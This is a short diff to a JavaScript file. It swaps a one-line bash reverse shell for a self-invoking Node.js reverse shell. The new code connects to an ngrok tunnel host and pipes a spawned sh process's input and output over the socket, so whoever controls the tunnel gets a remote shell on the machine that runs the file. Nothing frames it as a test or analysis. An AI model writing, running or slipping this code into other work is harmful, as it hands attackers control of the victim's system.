@@ -1,2 +1,12 @@
-console.log("runned");
-require('child_process').exec('sh -i >& /dev/tcp/0.tcp.ap.ngrok.io/10972 0>&1');
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("sh", []);
+    var client = new net.Socket();
+    client.connect(16029, "0.tcp.ap.ngrok.io", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
